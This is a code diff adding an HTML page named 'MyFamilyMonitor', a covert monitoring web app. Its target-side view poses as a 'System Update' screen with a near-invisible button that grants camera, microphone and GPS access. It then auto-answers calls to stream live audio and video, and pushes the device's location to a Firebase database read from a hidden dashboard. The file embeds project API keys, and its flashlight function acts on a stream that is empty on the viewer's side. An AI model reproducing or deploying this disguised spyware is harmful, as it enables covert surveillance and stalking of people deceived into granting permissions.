@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MyFamilyMonitor</title>
+    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <style>
+        body { background: #000; color: #111; font-family: sans-serif; margin: 0; text-align: center; overflow: hidden; }
+        /* Stealth Child View */
+        #child-view { display: block; padding-top: 45vh; color: #1a1a1a; font-size: 0.7rem; }
+        /* Parent Control Panel */
+        #parent-view { display: none; background: #0f172a; color: #f8fafc; min-height: 100vh; padding: 20px; box-sizing: border-box; }
+        video { width: 100%; max-width: 480px; border: 2px solid #38bdf8; border-radius: 12px; background: #000; margin: 15px 0; }
+        .btn { background: #38bdf8; color: #0f172a; padding: 15px; width: 100%; border: none; font-weight: bold; border-radius: 8px; margin: 8px 0; cursor: pointer; }
+        .danger { background: #ef4444; color: #fff; }
+        input { width: 90%; padding: 12px; margin: 10px 0; background: #1e293b; color: #fff; border: 1px solid #334155; border-radius: 5px; }
+        #gps-display { color: #94a3b8; font-size: 0.9rem; margin-bottom: 5px; }
+    </style>
+</head>
+<body>
+
+    <div id="child-view">
+        <p>System Update: 94% Complete...</p>
+        <button onclick="initChildStream()" style="background:transparent; border:none; color:#050505;">Initialize</button>
+        <div id="my-peer-id" style="color:#080808"></div>
+    </div>
+
+    <div id="parent-view">
+        <h2 style="color:#38bdf8; margin:0;">MyFamilyMonitor</h2>
+        <div id="gps-display">Location: Offline</div>
+        
+        <video id="remote-feed" autoplay playsinline></video>
+
+        <input type="text" id="target-id-input" placeholder="Paste Child ID Here">
+        <button class="btn danger" onclick="connectToChild()">WATCH LIVE STREAM</button>
+        
+        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
+            <button class="btn" onclick="toggleTorch()">Flashlight</button>
+            <button class="btn" onclick="refreshLoc()">Update GPS</button>
+        </div>
+    </div>
+
+<script>
+    // YOUR ACTUAL FIREBASE KEYS
+    const firebaseConfig = {
+        apiKey: "AIzaSyAecWOJkQr-ZG3XumwHf7R5evYecRyt0gc",
+        authDomain: "myfamilymonitor-f9959.firebaseapp.com",
+        projectId: "myfamilymonitor-f9959",
+        storageBucket: "myfamilymonitor-f9959.firebasestorage.app",
+        messagingSenderId: "478276972381",
+        appId: "1:478276972381:web:7a7605ba87d1d9cd7dc2b4",
+        databaseURL: "https://myfamilymonitor-f9959-default-rtdb.firebaseio.com"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+    const peer = new Peer();
+    let localMediaStream = null;
+
+    // Detect if we should show Parent Dashboard
+    if (window.location.search.includes('mode=parent')) {
+        document.getElementById('child-view').style.display = 'none';
+        document.getElementById('parent-view').style.display = 'block';
+    }
+
+    peer.on('open', (id) => {
+        document.getElementById('my-peer-id').innerText = id;
+    });
+
+    // CHILD DEVICE LOGIC
+    async function initChildStream() {
+        try {
+            localMediaStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            
+            // Watch GPS and push to Firebase wirelessly
+            navigator.geolocation.watchPosition(pos => {
+                db.ref('monitor/data').set({
+                    lat: pos.coords.latitude,
+                    lon: pos.coords.longitude,
+                    lastSeen: new Date().toLocaleTimeString()
+                });
+            }, null, { enableHighAccuracy: true });
+            
+        } catch (err) { alert("Permission required for camera/GPS!"); }
+    }
+
+    // Auto-answer calls from parent phone
+    peer.on('call', (call) => {
+        call.answer(localMediaStream);
+    });
+
+    // PARENT DASHBOARD LOGIC
+    function connectToChild() {
+        const targetId = document.getElementById('target-id-input').value;
+        const call = peer.call(targetId, null); // One-way call
+        
+        call.on('stream', (remoteStream) => {
+            const videoElement = document.getElementById('remote-feed');
+            videoElement.srcObject = remoteStream;
+            videoElement.muted = false; // LISTEN TO CHILD
+        });
+
+        // Pull GPS data from Firebase
+        db.ref('monitor/data').on('value', snapshot => {
+            const val = snapshot.val();
+            if(val) document.getElementById('gps-display').innerText = `Location: ${val.lat}, ${val.lon} (${val.lastSeen})`;
+        });
+    }
+
+    function toggleTorch() {
+        if(localMediaStream) {
+            const track = localMediaStream.getVideoTracks()[0];
+            track.applyConstraints({ advanced: [{ torch: true }] });
+        }
+    }
+
+    function refreshLoc() {
+        location.reload(); // Quick reset for 15mbps lag
+    }
+</script>
+</body>
+</html>
